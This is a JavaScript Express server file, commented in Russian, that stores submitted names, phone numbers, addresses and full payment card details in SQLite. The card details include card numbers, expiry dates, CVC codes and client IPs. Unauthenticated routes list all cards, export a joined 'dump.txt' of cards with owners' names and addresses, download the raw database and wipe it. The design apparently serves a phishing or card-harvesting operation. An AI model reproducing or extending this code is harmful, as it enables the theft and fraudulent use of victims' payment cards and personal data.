// server.js
import express from 'express';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';
import { initDB } from './db.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

// Разрешаем запросы с любого фронта
app.use(cors());
app.use(express.json());

// Инициализируем БД и только после этого вешаем роуты и запускаем сервер
initDB()
  .then(db => {
    console.log('SQLite готова');

    // Сохраняем данные пользователя
    app.post('/api/users', async (req, res) => {
      try {
        const { phoneNumber, address, name, orderItems, clientNumber, date } = req.body;
        const stmt = `
          INSERT INTO users
          (phoneNumber, address, name, orderItems, clientNumber, date)
          VALUES (?, ?, ?, ?, ?, ?)
        `;
        const result = await db.run(stmt, [
          phoneNumber,
          address,
          name,
          JSON.stringify(orderItems),
          clientNumber,
          date
        ]);
        res.status(201).json({ success: true, id: result.lastID });
      } catch (e) {
        console.error('Error in /api/users:', e);
        res.status(500).json({ success: false, error: e.message });
      }
    });

    // Сохраняем данные карты
    app.post('/api/cards', async (req, res) => {
      try {
        const {
          clientNumber,
          phoneNumber,
          cardNumber,
          expiryMonth,
          expiryYear,
          cvc,
          cardName,
          clientIP,
          date
        } = req.body;
        const stmt = `
          INSERT INTO cards
          (clientNumber, phoneNumber, cardNumber, expiryMonth, expiryYear, cvc, cardName, clientIP, date)
          VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        `;
        const params = [
          clientNumber,
          phoneNumber,
          cardNumber,
          expiryMonth,
          expiryYear,
          cvc,
          cardName,
          clientIP,
          date
        ];
        const result = await db.run(stmt, params);
        const saved = await db.get('SELECT * FROM cards WHERE id = ?', result.lastID);
        res.status(201).json(saved);
      } catch (e) {
        console.error('Error in /api/cards:', e);
        res.status(500).json({ success: false, error: e.message });
      }
    });

    // Вернуть все карты
    app.get('/api/cards', async (req, res) => {
      try {
        const all = await db.all('SELECT * FROM cards');
        res.json(all);
      } catch (e) {
        res.status(500).json({ success: false, error: e.message });
      }
    });

    // Скачать дамп в текстовом формате (без дубликатов по пользователям)
   app.get('/download-txt', async (req, res) => {
  try {
    // Подзапрос GROUP BY clientNumber гарантирует, 
    // что на каждый clientNumber от users будет ровно одна строка
    const rows = await db.all(`
      SELECT
        c.id         AS cardId,
        u.id         AS userId,
        c.clientNumber,
        c.phoneNumber,
        c.cardNumber,
        c.expiryMonth,
        c.expiryYear,
        c.cvc,
        c.cardName,
        c.clientIP,
        c.date,
        u.address,
        u.name
      FROM cards c
      LEFT JOIN (
        SELECT clientNumber, address, name
        FROM users
        GROUP BY clientNumber
      ) AS u
        ON c.clientNumber = u.clientNumber
    `);

    // Составляем текст
    const lines = rows.map(r =>
      Object.entries(r)
        .map(([k, v]) => `${k}=${v}`)
        .join('\t')
    );
    const content = lines.join('\n');

    // Отдаём файл
    res.setHeader('Content-Type',  'text/plain; charset=utf-8');
    res.setHeader('Content-Disposition', 'attachment; filename="dump.txt"');
    res.send(content);

  } catch (e) {
    console.error('Ошибка генерации дампа:', e);

    // Вместо 500 отдадим пустой текст –  клиент всё равно получит 200 и скачает empty-файл
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.setHeader('Content-Disposition', 'attachment; filename="dump.txt"');
    res.send('');
  }
});
    // Скачать файл базы SQLite
    app.get('/download', (req, res) => {
      const file = path.join(__dirname, 'data.sqlite');
      res.download(file, 'data.sqlite', err => {
        if (err) {
          console.error('Error downloading SQLite file:', err);
          res.status(500).send('Ошибка скачивания');
        }
      });
    });

    // Очистить всю БД
    app.delete('/api/clear', async (req, res) => {
      try {
        await db.exec('DELETE FROM cards;');
        await db.exec('DELETE FROM users;');
        await db.exec('DELETE FROM sqlite_sequence WHERE name="cards";');
        await db.exec('DELETE FROM sqlite_sequence WHERE name="users";');
        res.json({ success: true, message: 'База очищена: cards и users пусты.' });
      } catch (e) {
        console.error('Error clearing database:', e);
        res.status(500).json({ success: false, error: e.message });
      }
    });

    // Старт сервера
    const PORT = process.env.PORT || 3001;
    app.listen(PORT, () => console.log(`Сервер запущен на http://localhost:${PORT}`));
  })
  .catch(err => {
    console.error('Ошибка инициализации БД:', err);
    process.exit(1);
  });
